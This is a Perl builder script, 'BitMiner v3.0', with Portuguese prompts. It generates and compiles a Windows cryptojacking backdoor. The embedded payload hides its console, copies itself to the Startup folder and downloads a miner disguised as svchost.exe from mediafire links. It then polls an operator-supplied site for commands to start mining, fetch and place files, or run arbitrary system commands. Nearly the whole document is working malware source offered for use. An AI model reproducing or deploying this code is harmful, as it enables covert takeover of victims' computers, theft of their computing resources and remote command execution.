#!/usr/bin/perl -w
use Term::ANSIColor qw[color];
use Archive::Zip;
use LWP::Simple qw[getstore];
use Config;

$SIG{INT} = sub {sleep 3 and exit 0};
if($Config{osname} =~ m/win/i){
  system("cls");
}else{
  system("clear");
}

print color("RED");
print <<"ART";
\n/\\
||_____-----_____-----_____
||   O                  O  \\
||    O\\\\    ___    //O    /
||       \\\\ /   \\//        \\
||         |_O O_|         /        Valeu, Nyx !
||          ^ | ^          \\
||        // UUU \\\\        /
||    O//            \\\\O   \\
||   O                  O  /
||_____-----_____-----_____\\
||
ART
print color("reset");
print "\n\tBitMiner v3.0\n";

if(@ARGV){
  if(@ARGV > 1){
    print "\n[", color("YELLOW"),"!",color("reset"), "] Somente um parametro por vez permitido !\n";
    sleep 3;
    exit 0;
  }
  foreach(@ARGV){
    if($_ =~ m/--install-compiler/){
      my $zip = undef;
      print "\n[", color("YELLOW"),"!",color("reset"), "] Baixando o compilador", color("RED"),"...",color("reset"), "\n";
      getstore("http://indigostar.com/download/perl2exe-24.00-win.zip", "perl2exe.zip");
      $zip = Archive::Zip->new;
      $zip->read("perl2exe.zip");
      $zip->extractTree();
      unlink "perl2exe.zip";
      rename "perl2exe-24.00-win", "perl2exe";
      print "\n[", color("YELLOW"),"!",color("reset"), "] Sucesso !\n";
      sleep 3;
      exit 0;
    }
    else{
      print "\n[", color("YELLOW"),"!",color("reset"), "] Parametro invalido !\n";
    }
  }
}else{
  print "\n[", color("YELLOW"),"!",color("reset"), "] Digite seu site: ";
  my $www = <STDIN>;
  chomp $www if $www;
  until($www){
    print "[", color("YELLOW"),"!",color("reset"), "] Digite seu site: ";
    $www = <STDIN>;
    chomp $www if $www;
  }
  &generate($www);
}

sub generate{
  if(! -e "perl2exe"){
    print "\n[", color("YELLOW"),"!",color("reset"), "] Nenhum compilador encontrado, execute $0 --install-compiler !\n";
    sleep 3;
    exit 0;   
  }
  unless($_[0]){
    print "\n[", color("YELLOW"),"!",color("reset"), "] Ocorreu um erro, tente novamente !\n";
    sleep 3;
    exit 0;
  }
  print "\n";
  $_[0] = "http://" . $_[0] if $_[0] !~ m/^(http|https):\/\//;
  $_[0] =~ s/\/$//;
  open(OUTPUT, ">", "output.pl");
  print OUTPUT 
'#!/usr/bin/perl -w

### Modules ###

BEGIN {
  use Win32::HideConsole "hide_console";
  hide_console;
}

use File::Basename "basename";
use LWP::UserAgent qw(get agent decoded_content);
use LWP::Simple "getstore";
use Config;

#perl2exe_include Win32::HideConsole
#perl2exe_include File::Basename
#perl2exe_include LWP::UserAgent
#perl2exe_include LWP::Simple
#perl2exe_include Config

### Modules ###

while(1){
  until(-e "/Users/$ENV{USERNAME}/AppData/Roaming/Microsoft/Windows/\"Start Menu\"/Programs/Startup/" . basename($0)){
    system(\'copy \' . basename($0) . \' %AppData%\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\');
  }
  until(-e "/Users/$ENV{USERNAME}/AppData/Roaming/svchost.exe"){
    if($Config{archname} =~ /x86_64/ || $Config{archname} =~ /x64/){
      getstore(\'http://download1586.mediafire.com/be53cm3cn4bg/1u4lyk5417hvs2f/NsCpuCNMiner64.exe\', \'svchost.exe\');
    }else{
      getstore(\'http://download1518.mediafire.com/nc4r1dswctmg/j4d7gysid869wld/NsCpuCNMiner32.exe\', \'svchost.exe\');
    }
    if(-e \'svchost.exe\'){
      system(\'move svchost.exe %AppData%\');
    }
  }
  my $get = LWP::UserAgent->new; $get->agent(\'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4\');
  my $res = $get->get(\'', $_[0], '\');
  if($res->decoded_content =~ m/miner\[(.+),(.+)\]/){
    system("cd %AppData% && svchost.exe -o stratum+tcp://$1 -u $2 -p x");
  }
  if($res->decoded_content =~ m/download\[(.+),(.+),(.+)\]/){
    getstore($1, $2);
    system(\'move \' . $2 . \' \' . $3);
  }
  if($res->decoded_content =~ m/system\[(.+)\]/){
    system($1);
  }
}';
  close(OUTPUT);
  if($^V =~ m/5.24.1/){
    system("perl2exe\\perl2exe.exe -platform=Win32-5.24.1 -o output_32.exe output.pl");  
    if(-e "output_32.exe"){
      print "\nExecutavel de 32 bits gerado com sucesso !\n\n";
    }else{
      print "\nExecutavel de 32 bits nao foi gerado !\n\n";
    }
    system("perl2exe\\perl2exe.exe -platform=Win64-5.24.1 -o output_64.exe output.pl");
    if(-e "output_64.exe"){
      print "\nExecutavel de 64 bits gerado com sucesso !\n";
    }else{
      print "\nExecutavel de 64 bits nao foi gerado !\n";
    }
  }
  elsif($^V =~ m/5.24.0/){
    system("perl2exe\\perl2exe.exe -platform=Win32-5.24.0 -o output_32.exe output.pl");
    if(-e "output_32.exe"){
      print "\nExecutavel de 32 bits gerado com sucesso !\n\n";
    }else{
      print "\nExecutavel de 32 bits nao foi gerado !\n\n";
    }
    system("perl2exe\\perl2exe.exe -platform=Win64-5.24.0 -o output_64.exe output.pl");
    if(-e "output_64.exe"){
      print "\nExecutavel de 64 bits gerado com sucesso !\n";
    }else{
      print "\nExecutavel de 64 bits nao foi gerado !\n";
    }
  }
  else{
    print "\n[", color("YELLOW"),"!",color("reset"), "] Somente as versoes 5.24.1 e 5.24.0 sao suportadas !\n";
  }
  unlink "output.pl";
  sleep 3;
}
